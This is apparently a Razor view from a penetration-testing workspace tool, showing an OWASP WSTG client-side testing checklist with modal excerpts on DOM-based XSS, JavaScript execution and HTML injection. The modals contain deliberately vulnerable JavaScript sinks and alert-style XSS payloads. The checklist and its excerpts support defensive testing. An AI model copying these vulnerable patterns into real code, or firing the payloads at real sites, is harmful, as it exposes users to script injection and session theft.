@model Cervantes.Web.Areas.Workspace.Models.Wstg.WSTGViewModel

<div class="table-responsive-md">
            <table class="table table-bordered table-hover" id="clntt" width="100%">
                <thead class="thead-dark">
                <tr>
                    <th><i class="fas fa-user-cog"></i> Client-Side Testing</th>
                    <th><i class="fas fa-vial"></i> Test Name</th>
                    <th><i class="fas fa-bullseye"></i> Objectives</th>
                    
                    <th><i class="fas fa-project-diagram"></i> Status</th>
                    
                    <th><i class="fas fa-sticky-note"></i> Notes</th>
                    
                    <th>
                        <i class="fas fa-eye"></i>
                    </th>
                    
                    
                </tr>
                </thead>
                <tbody>
                <tr>
                    <td>WSTG-CLNT-01</td>
                    <td>Testing for DOM-Based Cross Site Scripting</td>
                                    
                    <td><p>- Identify DOM sinks.</p>
                        <p>- Build payloads that pertain to every sink type.</p></td>
                                    
                    <td>
                       @Html.DropDownListFor(model => model.Clnt.Clnt01Status, Html.GetEnumSelectList<Cervantes.CORE.WSTGStatus>(), new {@class = "form-control"})

                    </td>
                    <td>    <textarea asp-for="Clnt.Clnt01Note" class="form-control" rows="4"></textarea> </td>
                    <td>
                        <button type="button" class="btn btn-tool" data-toggle="modal" data-target="#clnt1Modal">
                            <i class="fas fa-eye"></i>
                        </button>
                    </td>
                </tr>
                <tr>
                    <td>WSTG-CLNT-02</td>
                    <td>Testing for JavaScript Execution</td>
                                                    
                    <td>- Identify sinks and possible JavaScript injection points.</td>
                                                    
                    <td>
                        @Html.DropDownListFor(model => model.Clnt.Clnt02Status, Html.GetEnumSelectList<Cervantes.CORE.WSTGStatus>(), new {@class = "form-control"})
                    </td>
                    <td>  <textarea asp-for="Clnt.Clnt02Note" class="form-control" rows="4"></textarea></td>
                    <td>
                        <button type="button" class="btn btn-tool" data-toggle="modal" data-target="#clnt2Modal">
                            <i class="fas fa-eye"></i>
                        </button>
                    </td>
                </tr>
                <tr>
                    <td>WSTG-CLNT-03</td>
                    <td>Testing for HTML Injection</td>
                                                    
                    <td>- Identify HTML injection points and assess the severity of the injected content.</td>
                                                    
                    <td>
                        @Html.DropDownListFor(model => model.Clnt.Clnt03Status, Html.GetEnumSelectList<Cervantes.CORE.WSTGStatus>(), new {@class = "form-control"})
                    </td>
                    <td> <textarea asp-for="Clnt.Clnt03Note" class="form-control" rows="4"></textarea> </td>
                    <td>
                        <button type="button" class="btn btn-tool" data-toggle="modal" data-target="#clnt3Modal">
                            <i class="fas fa-eye"></i>
                        </button>
                    </td>
                </tr>
                <tr>
                    <td>WSTG-CLNT-04</td>
                    <td>Testing for Client Side URL Redirect</td>
                                                    
                    <td><p>- Identify injection points that handle URLs or paths.</p>
                        <p>- Assess the locations that the system could redirect to.</p></td>
                                                    
                    <td>
                        @Html.DropDownListFor(model => model.Clnt.Clnt04Status, Html.GetEnumSelectList<Cervantes.CORE.WSTGStatus>(), new {@class = "form-control"})
                    </td>
                    <td> <textarea asp-for="Clnt.Clnt04Note" class="form-control" rows="4"></textarea></td>
                    <td>
                        <button type="button" class="btn btn-tool" data-toggle="modal" data-target="#clnt4Modal">
                            <i class="fas fa-eye"></i>
                        </button>
                    </td>
                </tr>
                <tr>
                    <td>WSTG-CLNT-05</td>
                    <td>Testing for CSS Injection</td>
                                                    
                    <td><p>- Identify CSS injection points.</p>
                        <p>- Assess the impact of the injection.</p></td>
                                                    
                    <td>
                        @Html.DropDownListFor(model => model.Clnt.Clnt05Status, Html.GetEnumSelectList<Cervantes.CORE.WSTGStatus>(), new {@class = "form-control"})
                    </td>
                    <td> <textarea asp-for="Clnt.Clnt05Note" class="form-control" rows="4"></textarea></td>
                    <td>
                        <button type="button" class="btn btn-tool" data-toggle="modal" data-target="#clnt5Modal">
                            <i class="fas fa-eye"></i>
                        </button>
                    </td>
                </tr>
                <tr>
                    <td>WSTG-CLNT-06</td>
                    <td>Testing for Client Side Resource Manipulation</td>
                                                    
                    <td><p>- Identify sinks with weak input validation.</p>
                        <p>- Assess the impact of the resource manipulation.</p></td>
                                                    
                    <td>
                        @Html.DropDownListFor(model => model.Clnt.Clnt06Status, Html.GetEnumSelectList<Cervantes.CORE.WSTGStatus>(), new {@class = "form-control"})
                    </td>
                    <td> <textarea asp-for="Clnt.Clnt06Note" class="form-control" rows="4"></textarea> </td>
                    <td>
                        <button type="button" class="btn btn-tool" data-toggle="modal" data-target="#clnt6Modal">
                            <i class="fas fa-eye"></i>
                        </button>
                    </td>
                </tr>
                <tr>
                    <td>WSTG-CLNT-07</td>
                    <td>Test Cross Origin Resource Sharing</td>
                                                    
                    <td><p>- Identify endpoints that implement CORS.</p>
                        <p>- Ensure that the CORS configuration is secure or harmless.</p></td>
                                                    
                    <td>
                        @Html.DropDownListFor(model => model.Clnt.Clnt07Status, Html.GetEnumSelectList<Cervantes.CORE.WSTGStatus>(), new {@class = "form-control"})
                    </td>
                    <td>  <textarea asp-for="Clnt.Clnt07Note" class="form-control" rows="4"></textarea> </td>
                    <td>
                        <button type="button" class="btn btn-tool" data-toggle="modal" data-target="#clnt7Modal">
                            <i class="fas fa-eye"></i>
                        </button>
                    </td>
                </tr>
                <tr>
                    <td>WSTG-CLNT-08</td>
                    <td>Testing for Cross Site Flashing</td>
                                                    
                    <td><p>- Decompile and analyze the application's code.</p>
                        <p>- Assess sinks inputs and unsafe method usages.</p></td>
                                                    
                    <td>
                        @Html.DropDownListFor(model => model.Clnt.Clnt08Status, Html.GetEnumSelectList<Cervantes.CORE.WSTGStatus>(), new {@class = "form-control"})
                    </td>
                    <td>  <textarea asp-for="Clnt.Clnt08Note" class="form-control" rows="4"></textarea> </td>
                    <td>
                        <button type="button" class="btn btn-tool" data-toggle="modal" data-target="#clnt8Modal">
                            <i class="fas fa-eye"></i>
                        </button>
                    </td>
                </tr>
                <tr>
                    <td>WSTG-CLNT-09</td>
                    <td>Testing for Clickjacking</td>
                                                    
                    <td><p>- Understand security measures in place.</p>
                        <p>- Assess how strict the security measures are and if they are bypassable.</p></td>
                                                    
                    <td>
                        @Html.DropDownListFor(model => model.Clnt.Clnt09Status, Html.GetEnumSelectList<Cervantes.CORE.WSTGStatus>(), new {@class = "form-control"})
                    </td>
                    <td>  <textarea asp-for="Clnt.Clnt09Note" class="form-control" rows="4"></textarea> </td>
                    <td>
                        <button type="button" class="btn btn-tool" data-toggle="modal" data-target="#clnt9Modal">
                            <i class="fas fa-eye"></i>
                        </button>
                    </td>
                </tr>
                <tr>
                    <td>WSTG-CLNT-10</td>
                    <td>Testing WebSockets</td>
                                                    
                    <td><p>- Identify the usage of WebSockets.</p>
                        <p>- Assess its implementation by using the same tests on normal HTTP channels.</p></td>
                                                    
                    <td>
                        @Html.DropDownListFor(model => model.Clnt.Clnt10Status, Html.GetEnumSelectList<Cervantes.CORE.WSTGStatus>(), new {@class = "form-control"})
                    </td>
                    <td>  <textarea asp-for="Clnt.Clnt10Note" class="form-control" rows="4"></textarea></td>
                    <td>
                        <button type="button" class="btn btn-tool" data-toggle="modal" data-target="#clnt10Modal">
                            <i class="fas fa-eye"></i>
                        </button>
                    </td>
                </tr>
                <tr>
                    <td>WSTG-CLNT-11</td>
                    <td>Test Web Messaging</td>
                                                    
                    <td><p>- Assess the security of the message's origin.</p>
                        <p>- Validate that it's using safe methods and validating its input.</p></td>
                                                    
                    <td>
                        @Html.DropDownListFor(model => model.Clnt.Clnt11Status, Html.GetEnumSelectList<Cervantes.CORE.WSTGStatus>(), new {@class = "form-control"})
                    </td>
                    <td> <textarea asp-for="Clnt.Clnt11Note" class="form-control" rows="4"></textarea> </td>
                    <td>
                        <button type="button" class="btn btn-tool" data-toggle="modal" data-target="#clnt11Modal">
                            <i class="fas fa-eye"></i>
                        </button>
                    </td>
                </tr>
                <tr>
                    <td>WSTG-CLNT-12</td>
                    <td>Testing Browser Storage</td>
                                                    
                    <td><p>- Determine whether the website is storing sensitive data in client-side storage.</p>
                        <p>- The code handling of the storage objects should be examined for possibilities of injection attacks, such as utilizing unvalidated input or vulnerable libraries.</p></td>
                                                    
                    <td>
                        @Html.DropDownListFor(model => model.Clnt.Clnt12Status, Html.GetEnumSelectList<Cervantes.CORE.WSTGStatus>(), new {@class = "form-control"})
                    </td>
                    <td> <textarea asp-for="Clnt.Clnt12Note" class="form-control" rows="4"></textarea> </td>
                    <td>
                        <button type="button" class="btn btn-tool" data-toggle="modal" data-target="#clnt12Modal">
                            <i class="fas fa-eye"></i>
                        </button>
                    </td>
                </tr>
                <tr>
                    <td>WSTG-CLNT-13</td>
                    <td>Testing for Cross Site Script Inclusion</td>
                                                    
                    <td><p>- Locate sensitive data across the system.</p>
                        <p>- Assess the leakage of sensitive data through various techniques.</p></td>
                                                    
                    <td>
                        @Html.DropDownListFor(model => model.Clnt.Clnt13Status, Html.GetEnumSelectList<Cervantes.CORE.WSTGStatus>(), new {@class = "form-control"})
                    </td>
                    <td> <textarea asp-for="Clnt.Clnt13Note" class="form-control" rows="4"></textarea></td>
                    <td>
                        <button type="button" class="btn btn-tool" data-toggle="modal" data-target="#clnt13Modal">
                            <i class="fas fa-eye"></i>
                        </button>
                    </td>
                </tr>
            </tbody>
            </table>
        </div>

<!-- Modal -->
<div class="modal fade" id="clnt1Modal" tabindex="-1" role="dialog" aria-labelledby="clnt1ModalLabel" aria-hidden="true">
    <div class="modal-dialog modal-xl" role="document">
        <div class="modal-content">
            <div class="modal-header">
                <h5 class="modal-title" id="clnt1ModalLabel">WSTG-CLNT-01 - Testing for DOM-Based Cross Site Scripting</h5>
                <button type="button" class="close" data-dismiss="modal" aria-label="Close">
                    <span aria-hidden="true">&times;</span>
                </button>
            </div>
            <div class="modal-body">
                <h2 id="summary">Summary</h2>
                
                <p><a href="https://owasp.org/www-community/attacks/DOM_Based_XSS">DOM-based cross-site scripting</a> is the de-facto name for <a href="https://owasp.org/www-community/attacks/xss/">XSS</a> bugs that are the result of active browser-side content on a page, typically JavaScript, obtaining user input through a <a href="https://github.com/wisec/domxsswiki/wiki/sources">source</a> and using it in a <a href="https://github.com/wisec/domxsswiki/wiki/Sinks">sink</a>, leading to the execution of injected code. This document only discusses JavaScript bugs which lead to XSS.</p>
                
                <p>The DOM, or <a href="https://en.wikipedia.org/wiki/Document_Object_Model">Document Object Model</a>, is the structural format used to represent documents in a browser. The DOM enables dynamic scripts such as JavaScript to reference components of the document such as a form field or a session cookie. The DOM is also used by the browser for security - for example to limit scripts on different domains from obtaining session cookies for other domains. A DOM-based XSS vulnerability may occur when active content, such as a JavaScript function, is modified by a specially crafted request such that a DOM element that can be controlled by an attacker.</p>
                
                <p>Not all XSS bugs require the attacker to control the content returned from the server, but can instead abuse poor JavaScript coding practices to achieve the same results. The consequences are the same as a typical XSS flaw, only the means of delivery is different.</p>
                
                <p>In comparison to other types of cross site scripting vulnerabilities (<a href="https://owasp.org/www-community/attacks/xss/">reflected and stored</a>, where an un-sanitized parameter is passed by the server then returned to the user and executed in the context of the user’s browser, a DOM-based XSS vulnerability controls the flow of the code by using elements of the Document Object Model (DOM) along with code crafted by the attacker to change the flow.</p>
                
                <p>Due to their nature, DOM-based XSS vulnerabilities can be executed in many instances without the server being able to determine what is actually being executed. This may make many of the general XSS filtering and detection techniques impotent to such attacks.</p>
                
                <p>This hypothetical example uses the following client-side code:</p>
                
                <div class="language-html highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nt">&lt;script&gt;</span>
                <span class="nb">document</span><span class="p">.</span><span class="nx">write</span><span class="p">(</span><span class="dl">"</span><span class="s2">Site&nbsp;is&nbsp;at:&nbsp;</span><span class="dl">"</span><span class="err">&nbsp;</span><span class="o">+</span><span class="err">&nbsp;</span><span class="nb">document</span><span class="p">.</span><span class="nx">location</span><span class="p">.</span><span class="nx">href</span><span class="err">&nbsp;</span><span class="o">+</span><span class="err">&nbsp;</span><span class="dl">"</span><span class="s2">.</span><span class="dl">"</span><span class="p">);</span>
                <span class="nt">&lt;/script&gt;</span>
                </code></pre></div></div>
                
                <p>An attacker may append <code class="language-plaintext highlighter-rouge">#&lt;script&gt;alert('xss')&lt;/script&gt;</code> to the affected page URL which would, when executed, display the alert box. In this instance, the appended code would not be sent to the server as everything after the <code class="language-plaintext highlighter-rouge">#</code> character is not treated as part of the query by the browser, but as a fragment. In this example, the code is immediately executed and an alert of “xss” is displayed by the page. Unlike the more common types of cross site scripting (<a href="https://owasp.org/www-community/attacks/xss/">reflected and stored</a> in which the code is sent to the server and then back to the browser, this is executed directly in the user’s browser without server contact.</p>
                
                <p>The <a href="https://owasp.org/www-community/attacks/xss/">consequences</a> of DOM-based XSS flaws are as wide ranging as those seen in more well known forms of XSS, including cookie retrieval, further malicious script injection, etc., and should therefore be treated with the same severity.</p>
                
                <h2 id="test-objectives">Test Objectives</h2>
                
                <ul>
                  <li>Identify DOM sinks.</li>
                  <li>Build payloads that pertain to every sink type.</li>
                </ul>
                
                <h2 id="how-to-test">How to Test</h2>
                
                <p>JavaScript applications differ significantly from other types of applications because they are often dynamically generated by the server. To understand what code is being executed, the website being tested needs to be crawled to determine all the instances of JavaScript being executed and where user input is accepted. Many websites rely on large libraries of functions, which often stretch into the hundreds of thousands of lines of code and have not been developed in-house. In these cases, top-down testing often becomes the only viable option, since many bottom level functions are never used, and analyzing them to determine which are sinks will use up more time than is often available. The same can also be said for top-down testing if the inputs or lack thereof is not identified to begin with.</p>
                
                <p>User input comes in two main forms:</p>
                
                <ul>
                  <li>Input written to the page by the server in a way that does not allow direct XSS, and</li>
                  <li>Input obtained from client-side JavaScript objects.</li>
                </ul>
                
                <p>Here are two examples of how the server may insert data into JavaScript:</p>
                
                <div class="language-js highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="kd">var</span><span class="err">&nbsp;</span><span class="nx">data</span><span class="err">&nbsp;</span><span class="o">=</span><span class="err">&nbsp;</span><span class="dl">"</span><span class="s2">&lt;escaped data from the server&gt;</span><span class="dl">"</span><span class="p">;</span>
                <span class="kd">var</span><span class="err">&nbsp;</span><span class="nx">result</span><span class="err">&nbsp;</span><span class="o">=</span><span class="err">&nbsp;</span><span class="nx">someFunction</span><span class="p">(</span><span class="dl">"</span><span class="s2">&lt;escaped data from the server&gt;</span><span class="dl">"</span><span class="p">);</span>
                </code></pre></div></div>
                
                <p>Here are two examples of input from client-side JavaScript objects:</p>
                
                <div class="language-js highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="kd">var</span><span class="err">&nbsp;</span><span class="nx">data</span><span class="err">&nbsp;</span><span class="o">=</span><span class="err">&nbsp;</span><span class="nb">window</span><span class="p">.</span><span class="nx">location</span><span class="p">;</span>
                <span class="kd">var</span><span class="err">&nbsp;</span><span class="nx">result</span><span class="err">&nbsp;</span><span class="o">=</span><span class="err">&nbsp;</span><span class="nx">someFunction</span><span class="p">(</span><span class="nb">window</span><span class="p">.</span><span class="nx">referrer</span><span class="p">);</span>
                </code></pre></div></div>
                
                <p>While there is little difference to the JavaScript code in how they are retrieved, it is important to note that when input is received via the server, the server can apply any permutations to the data that it desires. On the other hand, the permutations performed by JavaScript objects are fairly well understood and documented. If <code class="language-plaintext highlighter-rouge">someFunction</code> in the above example were a sink, then the exploitability in the former case would depend on the filtering done by the server, whereas in the latter case it would depend on the encoding done by the browser on the <code class="language-plaintext highlighter-rouge">window.referrer</code> object. Stefano Di Paulo has written an excellent article on what browsers return when asked for the various elements of a <a href="https://github.com/wisec/domxsswiki/wiki/location,-documentURI-and-URL-sources">URL using the document and location attributes</a>.</p>
                
                <p>Additionally, JavaScript is often executed outside of <code class="language-plaintext highlighter-rouge">&lt;script&gt;</code> blocks, as evidenced by the many vectors which have led to XSS filter bypasses in the past. When crawling the application, it is important to note the use of scripts in places such as event handlers and CSS blocks with expression attributes. Also, note that any off-site CSS or script objects will need to be assessed to determine what code is being executed.</p>
                
                <p>Automated testing has only very limited success at identifying and validating DOM-based XSS as it usually identifies XSS by sending a specific payload and attempts to observe it in the server response. This may work fine for the simple example provided below, where the message parameter is reflected back to the user:</p>
                
                <div class="language-html highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nt">&lt;script&gt;</span>
                <span class="kd">var</span> <span class="nx">pos</span><span class="o">=</span><span class="nb">document</span><span class="p">.</span><span class="nx">URL</span><span class="p">.</span><span class="nx">indexOf</span><span class="p">(</span><span class="dl">"</span><span class="s2">message=</span><span class="dl">"</span><span class="p">)</span><span class="o">+</span><span class="mi">5</span><span class="p">;</span>
                <span class="nb">document</span><span class="p">.</span><span class="nx">write</span><span class="p">(</span><span class="nb">document</span><span class="p">.</span><span class="nx">URL</span><span class="p">.</span><span class="nx">substring</span><span class="p">(</span><span class="nx">pos</span><span class="p">,</span><span class="nb">document</span><span class="p">.</span><span class="nx">URL</span><span class="p">.</span><span class="nx">length</span><span class="p">));</span>
                <span class="nt">&lt;/script&gt;</span>
                </code></pre></div></div>
                
                <p>However, it may not be detected in the following contrived case:</p>
                
                <div class="language-html highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nt">&lt;script&gt;</span>
                <span class="kd">var</span> <span class="nx">navAgt</span> <span class="o">=</span> <span class="nb">navigator</span><span class="p">.</span><span class="nx">userAgent</span><span class="p">;</span>
                
                <span class="k">if</span> <span class="p">(</span><span class="nx">navAgt</span><span class="p">.</span><span class="nx">indexOf</span><span class="p">(</span><span class="dl">"</span><span class="s2">MSIE</span><span class="dl">"</span><span class="p">)</span><span class="o">!=-</span><span class="mi">1</span><span class="p">)</span> <span class="p">{</span>
                        <span class="nb">document</span><span class="p">.</span><span class="nx">write</span><span class="p">(</span><span class="dl">"</span><span class="s2">You are using IE as a browser and visiting site: </span><span class="dl">"</span> <span class="o">+</span> <span class="nb">document</span><span class="p">.</span><span class="nx">location</span><span class="p">.</span><span class="nx">href</span> <span class="o">+</span> <span class="dl">"</span><span class="s2">.</span><span class="dl">"</span><span class="p">);</span>
                <span class="p">}</span>
                <span class="k">else</span>
                <span class="p">{</span>
                    <span class="nb">document</span><span class="p">.</span><span class="nx">write</span><span class="p">(</span><span class="dl">"</span><span class="s2">You are using an unknown browser.</span><span class="dl">"</span><span class="p">);</span>
                <span class="p">}</span>
                <span class="nt">&lt;/script&gt;</span>
                </code></pre></div></div>
                
                <p>For this reason, automated testing will not detect areas that may be susceptible to DOM-based XSS unless the testing tool can perform additional analysis of the client-side code.</p>
                
                <p>Manual testing should therefore be undertaken and can be done by examining areas in the code where parameters are referred to that may be useful to an attacker. Examples of such areas include places where code is dynamically written to the page and elsewhere where the DOM is modified or even where scripts are directly executed.</p>
                
                <h2 id="remediation">Remediation</h2>
                
                <p>For measures to prevent DOM-based XSS, see the <a href="https://cheatsheetseries.owasp.org/cheatsheets/DOM_based_XSS_Prevention_Cheat_Sheet.html">DOM-based XSS Prevention Cheat Sheet</a>.</p>
                
                <h2 id="references">References</h2>
                
                <ul>
                  <li><a href="https://github.com/wisec/domxsswiki/wiki/">DomXSSWiki</a></li>
                  <li><a href="http://www.webappsec.org/projects/articles/071105.html">DOM XSS article by Amit Klein</a></li>
                </ul>

            </div>
            <div class="modal-footer">
                <a href="https://owasp.org/www-project-web-security-testing-guide/stable/4-Web_Application_Security_Testing/11-Client-side_Testing/01-Testing_for_DOM-based_Cross_Site_Scripting" class="btn btn-success" target="_blank">View on owasp.org</a>
                <button type="button" class="btn btn-secondary" data-dismiss="modal">Close</button>
            </div>
        </div>
    </div>
</div>

<!-- Modal -->
<div class="modal fade" id="clnt2Modal" tabindex="-1" role="dialog" aria-labelledby="clnt2ModalLabel" aria-hidden="true">
    <div class="modal-dialog modal-xl" role="document">
        <div class="modal-content">
            <div class="modal-header">
                <h5 class="modal-title" id="clnt2ModalLabel">WSTG-CLNT-02 - Testing for JavaScript Execution</h5>
                <button type="button" class="close" data-dismiss="modal" aria-label="Close">
                    <span aria-hidden="true">&times;</span>
                </button>
            </div>
            <div class="modal-body">
                <h2 id="summary">Summary</h2>
                
                <p>A JavaScript injection vulnerability is a subtype of cross site scripting (XSS) that involves the ability to inject arbitrary JavaScript code that is executed by the application inside the victim’s browser. This vulnerability can have many consequences, like the disclosure of a user’s session cookies that could be used to impersonate the victim, or, more generally, it can allow the attacker to modify the page content seen by the victims or the application’s behavior.</p>
                
                <p>JavaScript injection vulnerabilities can occur when the application lacks proper user-supplied input and output validation. As JavaScript is used to dynamically populate web pages, this injection occurs during this content processing phase and consequently affects the victim.</p>
                
                <p>When testing for this vulnerability, consider that some characters are treated differently by different browsers. For reference, see <a href="https://owasp.org/www-community/attacks/DOM_Based_XSS">DOM-based XSS</a>.</p>
                
                <p>Here is an example of a script that does not perform any validation of the variable <code class="language-plaintext highlighter-rouge">rr</code>. The variable contains user-supplied input via the query string, and additionally does not apply any form of encoding:</p>
                
                <div class="language-js highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="kd">var</span> <span class="nx">rr</span> <span class="o">=</span> <span class="nx">location</span><span class="p">.</span><span class="nx">search</span><span class="p">.</span><span class="nx">substring</span><span class="p">(</span><span class="mi">1</span><span class="p">);</span>
                <span class="k">if</span><span class="p">(</span><span class="nx">rr</span><span class="p">)</span> <span class="p">{</span>
                    <span class="nb">window</span><span class="p">.</span><span class="nx">location</span><span class="o">=</span><span class="nb">decodeURIComponent</span><span class="p">(</span><span class="nx">rr</span><span class="p">);</span>
                <span class="p">}</span>
                </code></pre></div></div>
                
                <p>This implies that an attacker could inject JavaScript code simply by submitting the following query string: <code class="language-plaintext highlighter-rouge">www.victim.com/?javascript:alert(1)</code>.</p>
                
                <h2 id="test-objectives">Test Objectives</h2>
                
                <ul>
                  <li>Identify sinks and possible JavaScript injection points.</li>
                </ul>
                
                <h2 id="how-to-test">How to Test</h2>
                
                <p>Consider the following: <a href="http://www.domxss.com/domxss/01_Basics/04_eval.html">DOM XSS exercise</a></p>
                
                <p>The page contains the following script:</p>
                
                <div class="language-html highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nt">&lt;script&gt;</span>
                <span class="kd">function</span> <span class="nx">loadObj</span><span class="p">(){</span>
                    <span class="kd">var</span> <span class="nx">cc</span><span class="o">=</span><span class="nb">eval</span><span class="p">(</span><span class="dl">'</span><span class="s1">(</span><span class="dl">'</span><span class="o">+</span><span class="nx">aMess</span><span class="o">+</span><span class="dl">'</span><span class="s1">)</span><span class="dl">'</span><span class="p">);</span>
                    <span class="nb">document</span><span class="p">.</span><span class="nx">getElementById</span><span class="p">(</span><span class="dl">'</span><span class="s1">mess</span><span class="dl">'</span><span class="p">).</span><span class="nx">textContent</span><span class="o">=</span><span class="nx">cc</span><span class="p">.</span><span class="nx">message</span><span class="p">;</span>
                <span class="p">}</span>
                
                <span class="k">if</span><span class="p">(</span><span class="nb">window</span><span class="p">.</span><span class="nx">location</span><span class="p">.</span><span class="nx">hash</span><span class="p">.</span><span class="nx">indexOf</span><span class="p">(</span><span class="dl">'</span><span class="s1">message</span><span class="dl">'</span><span class="p">)</span><span class="o">==-</span><span class="mi">1</span><span class="p">)</span> <span class="p">{</span>
                    <span class="kd">var</span> <span class="nx">aMess</span><span class="o">=</span><span class="dl">'</span><span class="s1">({"message":"Hello User!"})</span><span class="dl">'</span><span class="p">;</span>
                <span class="p">}</span> <span class="k">else</span> <span class="p">{</span>
                    <span class="kd">var</span> <span class="nx">aMess</span><span class="o">=</span><span class="nx">location</span><span class="p">.</span><span class="nx">hash</span><span class="p">.</span><span class="nx">substr</span><span class="p">(</span><span class="nb">window</span><span class="p">.</span><span class="nx">location</span><span class="p">.</span><span class="nx">hash</span><span class="p">.</span><span class="nx">indexOf</span><span class="p">(</span><span class="dl">'</span><span class="s1">message=</span><span class="dl">'</span><span class="p">)</span><span class="o">+</span><span class="mi">8</span><span class="p">)</span>
                <span class="p">}</span>
                <span class="nt">&lt;/script&gt;</span>
                </code></pre></div></div>
                
                <p>The above code contains a source <code class="language-plaintext highlighter-rouge">location.hash</code> that is controlled by the attacker that can inject directly in the <code class="language-plaintext highlighter-rouge">message</code> value a JavaScript Code to take the control of the user browser.</p>
            </div>
            <div class="modal-footer">
                <a href="https://owasp.org/www-project-web-security-testing-guide/stable/4-Web_Application_Security_Testing/11-Client-side_Testing/02-Testing_for_JavaScript_Execution" class="btn btn-success" target="_blank">View on owasp.org</a>
                <button type="button" class="btn btn-secondary" data-dismiss="modal">Close</button>
            </div>
        </div>
    </div>
</div>

<!-- Modal -->
<div class="modal fade" id="clnt3Modal" tabindex="-1" role="dialog" aria-labelledby="clnt3ModalLabel" aria-hidden="true">
    <div class="modal-dialog modal-xl" role="document">
        <div class="modal-content">
            <div class="modal-header">
                <h5 class="modal-title" id="clnt3ModalLabel">WSTG-CLNT-03 - Testing for HTML Injection</h5>
                <button type="button" class="close" data-dismiss="modal" aria-label="Close">
                    <span aria-hidden="true">&times;</span>
                </button>
            </div>
            <div class="modal-body">
                <h2 id="summary">Summary</h2>
                
                <p>HTML injection is a type of injection vulnerability that occurs when a user is able to control an input point and is able to inject arbitrary HTML code into a vulnerable web page. This vulnerability can have many consequences, like disclosure of a user’s session cookies that could be used to impersonate the victim, or, more generally, it can allow the attacker to modify the page content seen by the victims.</p>
                
                <p>This vulnerability occurs when user input is not correctly sanitized and the output is not encoded. An injection allows the attacker to send a malicious HTML page to a victim. The targeted browser will not be able to distinguish (trust) legitimate parts from malicious parts of the page, and consequently will parse and execute the whole page in the victim’s context.</p>
                
                <p>There is a wide range of methods and attributes that could be used to render HTML content. If these methods are provided with an untrusted input, then there is an high risk of HTML injection vulnerability. For example, malicious HTML code can be injected via the <code class="language-plaintext highlighter-rouge">innerHTML</code> JavaScript method, usually used to render user-inserted HTML code. If strings are not correctly sanitized, the method can enable HTML injection. A JavaScript function that can be used for this purpose is <code class="language-plaintext highlighter-rouge">document.write()</code>.</p>
                
                <p>The following example shows a snippet of vulnerable code that allows an unvalidated input to be used to create dynamic HTML in the page context:</p>
                
                <div class="language-js highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="kd">var</span> <span class="nx">userposition</span><span class="o">=</span><span class="nx">location</span><span class="p">.</span><span class="nx">href</span><span class="p">.</span><span class="nx">indexOf</span><span class="p">(</span><span class="dl">"</span><span class="s2">user=</span><span class="dl">"</span><span class="p">);</span>
                <span class="kd">var</span> <span class="nx">user</span><span class="o">=</span><span class="nx">location</span><span class="p">.</span><span class="nx">href</span><span class="p">.</span><span class="nx">substring</span><span class="p">(</span><span class="nx">userposition</span><span class="o">+</span><span class="mi">5</span><span class="p">);</span>
                <span class="nb">document</span><span class="p">.</span><span class="nx">getElementById</span><span class="p">(</span><span class="dl">"</span><span class="s2">Welcome</span><span class="dl">"</span><span class="p">).</span><span class="nx">innerHTML</span><span class="o">=</span><span class="dl">"</span><span class="s2"> Hello, </span><span class="dl">"</span><span class="o">+</span><span class="nx">user</span><span class="p">;</span>
                </code></pre></div></div>
                
                <p>The following example shows vulnerable code using the <code class="language-plaintext highlighter-rouge">document.write()</code> function:</p>
                
                <div class="language-js highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="kd">var</span> <span class="nx">userposition</span><span class="o">=</span><span class="nx">location</span><span class="p">.</span><span class="nx">href</span><span class="p">.</span><span class="nx">indexOf</span><span class="p">(</span><span class="dl">"</span><span class="s2">user=</span><span class="dl">"</span><span class="p">);</span>
                <span class="kd">var</span> <span class="nx">user</span><span class="o">=</span><span class="nx">location</span><span class="p">.</span><span class="nx">href</span><span class="p">.</span><span class="nx">substring</span><span class="p">(</span><span class="nx">userposition</span><span class="o">+</span><span class="mi">5</span><span class="p">);</span>
                <span class="nb">document</span><span class="p">.</span><span class="nx">write</span><span class="p">(</span><span class="dl">"</span><span class="s2">&lt;h1&gt;Hello, </span><span class="dl">"</span> <span class="o">+</span> <span class="nx">user</span> <span class="o">+</span><span class="dl">"</span><span class="s2">&lt;/h1&gt;</span><span class="dl">"</span><span class="p">);</span>
                </code></pre></div></div>
                
                <p>In both examples, this vulnerability can be exploited with an input such as:</p>
                
                <div class="language-text highlighter-rouge"><div class="highlight"><pre class="highlight"><code>http://vulnerable.site/page.html?user=&lt;img%20src='aaa'%20onerror=alert(1)&gt;
                </code></pre></div></div>
                
                <p>This input will add an image tag to the page that will execute arbitrary JavaScript code inserted by the malicious user in the HTML context.</p>
                
                <h2 id="test-objectives">Test Objectives</h2>
                
                <ul>
                  <li>Identify HTML injection points and assess the severity of the injected content.</li>
                </ul>
                
                <h2 id="how-to-test">How to Test</h2>
                
                <p>Consider the following DOM XSS exercise <a href="http://www.domxss.com/domxss/01_Basics/06_jquery_old_html.html">http://www.domxss.com/domxss/01_Basics/06_jquery_old_html.html</a></p>
                
                <p>The HTML code contains the following script:</p>
                
                <div class="language-html highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nt">&lt;script </span><span class="na">src=</span><span class="s">"../js/jquery-1.7.1.js"</span><span class="nt">&gt;&lt;/script&gt;</span>
                <span class="nt">&lt;script&gt;</span>
                <span class="kd">function</span> <span class="nx">setMessage</span><span class="p">(){</span>
                    <span class="kd">var</span> <span class="nx">t</span><span class="o">=</span><span class="nx">location</span><span class="p">.</span><span class="nx">hash</span><span class="p">.</span><span class="nx">slice</span><span class="p">(</span><span class="mi">1</span><span class="p">);</span>
                    <span class="nx">$</span><span class="p">(</span><span class="dl">"</span><span class="s2">div[id=</span><span class="dl">"</span><span class="o">+</span><span class="nx">t</span><span class="o">+</span><span class="dl">"</span><span class="s2">]</span><span class="dl">"</span><span class="p">).</span><span class="nx">text</span><span class="p">(</span><span class="dl">"</span><span class="s2">The DOM is now loaded and can be manipulated.</span><span class="dl">"</span><span class="p">);</span>
                <span class="p">}</span>
                <span class="nx">$</span><span class="p">(</span><span class="nb">document</span><span class="p">).</span><span class="nx">ready</span><span class="p">(</span><span class="nx">setMessage</span>  <span class="p">);</span>
